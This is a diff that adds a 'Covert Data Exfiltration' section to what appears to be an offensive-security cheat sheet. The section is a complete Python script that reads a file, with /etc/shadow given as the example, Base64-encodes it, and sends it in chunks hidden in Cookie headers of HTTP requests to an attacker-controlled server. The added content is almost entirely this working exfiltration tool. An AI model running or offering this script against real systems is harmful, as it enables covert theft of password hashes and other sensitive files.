@@ -108,7 +108,48 @@ Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Has
 
 
 
+## Covert Data Exfiltration
 
+Exfiltrates file as cookies in a http web request
 
+```
+import base64
+import requests
 
+# Path to the file to exfiltrate (e.g., /etc/shadow)
+file_path = "shadow"
+
+# Attacker's URL (replace with your malicious server)
+attacker_url = "http://10.0.0.10:80/"
+
+# Read and encode the file in Base64
+with open(file_path, "rb") as f:
+    file_data = f.read()
+    encoded_data = base64.b64encode(file_data).decode()
+
+# Function to split data into chunks (suitable for cookie size)
+def chunk_data(data, chunk_size=25):
+    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
+
+# Split the Base64 encoded data into smaller chunks for the Cookie header
+data_chunks = chunk_data(encoded_data)
+
+# Send each chunk as part of the Cookie header in a fake request
+for i, chunk in enumerate(data_chunks):
+    # Set the cookie with the chunked data
+    cookies = {
+        f'Session': chunk  # Cookies should be a dictionary
+    }
+
+    # Send the fake HTTP GET request with the data in the Cookie header
+    try:
+        response = requests.get(attacker_url, cookies=cookies)
+        if response.status_code == 200:
+            print(f"Successfully sent chunk {i+1}/{len(data_chunks)}")
+        else:
+            print(f"Failed to send chunk {i+1}: Status Code {response.status_code}")
+    except Exception as e:
+        print(f"Error sending chunk {i+1}: {e}")
+
+```
 
